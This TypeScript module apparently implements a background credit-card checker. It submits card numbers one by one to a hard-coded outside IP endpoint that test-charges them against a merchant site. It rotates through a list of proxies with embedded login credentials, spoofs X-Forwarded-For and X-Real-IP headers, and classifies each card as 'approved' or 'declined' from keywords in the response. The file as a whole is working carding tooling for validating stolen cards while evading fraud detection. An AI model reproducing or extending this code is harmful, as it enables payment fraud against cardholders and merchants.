import { getRunningSessions, updateCardSession, addCardResult } from './database'

// Background processor for card checking
class BackgroundProcessor {
  private isRunning = false
  private interval: NodeJS.Timeout | null = null
  private checkInterval = 5000 // Check every 5 seconds

  start() {
    if (this.isRunning) return
    
    this.isRunning = true
    this.interval = setInterval(() => {
      this.processRunningSessions()
    }, this.checkInterval)
    
    console.log('Background processor started')
  }

  stop() {
    if (this.interval) {
      clearInterval(this.interval)
      this.interval = null
    }
    this.isRunning = false
    console.log('Background processor stopped')
  }

  private async processRunningSessions() {
    try {
      const runningSessions = getRunningSessions()
      
      for (const session of runningSessions) {
        if (session.currentIndex >= session.cards.length) {
          // Session completed
          updateCardSession(session.id, { status: 'completed' })
          continue
        }

        // Get next card to check
        const currentCard = session.cards[session.currentIndex]
        
        // Check the card
        await this.checkCard(session.id, currentCard)
        
        // Add delay between checks
        await this.delay(2000)
      }
    } catch (error) {
      console.error('Background processor error:', error)
    }
  }

  private async checkCard(sessionId: string, card: string) {
    try {
      const baseApiUrl = "http://67.205.184.198:9080/key=cc/site=dashboardpack.com/data="
      const apiUrl = `${baseApiUrl}${encodeURIComponent(card)}`

      // Get a random proxy
      const proxyList = [
        'cz-pra.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2',
        'dk-cop.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2',
        'ee-tal.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2',
        'fi-esp.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2',
        'fr-par.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2',
        'de-ber.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2'
      ]
      
      const proxyString = proxyList[Math.floor(Math.random() * proxyList.length)]
      const [host, port, username, password] = proxyString.split(':')
      
      const proxyUrl = `http://${username}:${password}@${host}:${port}`
      const { HttpsProxyAgent } = await import('https-proxy-agent')
      const agent = new HttpsProxyAgent(proxyUrl)

      // Create timeout promise
      const timeoutPromise = new Promise((_, reject) => {
        setTimeout(() => reject(new Error('Request timeout')), 15000)
      })

      // Make the API request
      const fetchPromise = fetch(apiUrl, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'application/json, text/plain, */*',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
          'Accept-Language': 'en-US,en;q=0.9',
          'Accept-Encoding': 'gzip, deflate',
          'Connection': 'keep-alive',
          'Cache-Control': 'no-cache',
          'Pragma': 'no-cache',
          'X-Forwarded-For': '127.0.0.1',
          'X-Real-IP': '127.0.0.1'
        },
        // @ts-ignore
        agent: agent
      })

      const response = await Promise.race([fetchPromise, timeoutPromise]) as Response
      const responseText = await response.text()

      // Determine status
      const status = this.determineCardStatus(responseText)

      const result = {
        card,
        status,
        response: responseText,
        timestamp: new Date().toISOString()
      }

      // Add result to session
      addCardResult(sessionId, result)

      console.log(`Background check completed for card: ${card} - Status: ${status}`)

    } catch (error) {
      console.error(`Background check error for card: ${card}`, error)
      
      const result = {
        card,
        status: 'error' as const,
        response: `Error: ${error instanceof Error ? error.message : 'Unknown error'}`,
        timestamp: new Date().toISOString()
      }

      addCardResult(sessionId, result)
    }
  }

  private determineCardStatus(responseText: string): 'approved' | 'declined' | 'unknown' {
    const lowerResponse = responseText.toLowerCase()
    
    // Check for JSON error responses
    try {
      const jsonResponse = JSON.parse(responseText)
      if (jsonResponse.code || jsonResponse.error || jsonResponse.message) {
        return 'declined'
      }
    } catch (e) {
      // Not JSON, continue with text analysis
    }

    // Check for specific error patterns in text
    const errorPatterns = [
      'invalid', 'error', 'incorrect', 'failed', 'declined', 'do not honor',
      'insufficient', 'expired', 'invalid_expiry', 'invalid_card', 'invalid_cvv'
    ]
    
    if (errorPatterns.some(pattern => lowerResponse.includes(pattern))) {
      return 'declined'
    }

    // Check for approval patterns
    const approvedKeywords = [
      "transaction successful", "payment is done", "payment successful", 
      "approved", "success", "charge success", "valid", "live"
    ]
    
    if (approvedKeywords.some(keyword => lowerResponse.includes(keyword))) {
      return 'approved'
    }

    // Check for decline patterns
    const declinedKeywords = [
      "declined", "incorrect card number", "insufficient funds", 
      "failed", "error", "do not honor", "invalid", "dead"
    ]
    
    if (declinedKeywords.some(keyword => lowerResponse.includes(keyword))) {
      return 'declined'
    }

    return 'unknown'
  }

  private delay(ms: number): Promise<void> {
    return new Promise(resolve => setTimeout(resolve, ms))
  }

  isActive(): boolean {
    return this.isRunning
  }
}

// Create singleton instance
const backgroundProcessor = new BackgroundProcessor()

// Start background processor when module is loaded
backgroundProcessor.start()

export default backgroundProcessor 